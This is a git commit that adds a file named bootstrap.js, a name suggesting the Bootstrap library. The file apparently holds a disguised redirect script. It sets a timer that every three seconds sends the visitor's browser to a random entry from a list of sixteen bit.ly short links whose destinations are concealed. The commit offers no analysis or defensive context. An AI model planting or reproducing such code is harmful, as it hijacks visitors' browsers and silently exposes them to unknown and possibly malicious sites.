6bb1dfcaa515c1de2f61cbbc626180d9ebe1ae15
xhamster77 <44281448+xhamster77@users.noreply.github.com>
2018-10-19 09:31:11 +0700

    Add files via upload

---
+++ bootstrap.js
@@ -0,0 +1,12 @@
+<script type="text/javascript">
+
+var urls = new Array("http://bit.ly/2PGNPGZ", "http://bit.ly/2ysi4L8", "http://bit.ly/2Ct3WV3", "http://bit.ly/2ynYqQu", "http://bit.ly/2CQ5Fo8", "http://bit.ly/2q1E0IE", "http://bit.ly/2NP8E16", "http://bit.ly/2J6sNiy", "http://bit.ly/2J4TeFr", "http://bit.ly/2J4LVh1", "http://bit.ly/2PDppyg", "http://bit.ly/2Cqoz3X", "http://bit.ly/2q2dy1v", "http://bit.ly/2NQUI6W", "http://bit.ly/2OwxWGO", "http://bit.ly/2yrk9XN");
+
+function redirect()
+{
+window.location = urls[Math.floor(urls.length*Math.random())];
+}
+
+var temp = setInterval("redirect()", 3000);
+
+</script>
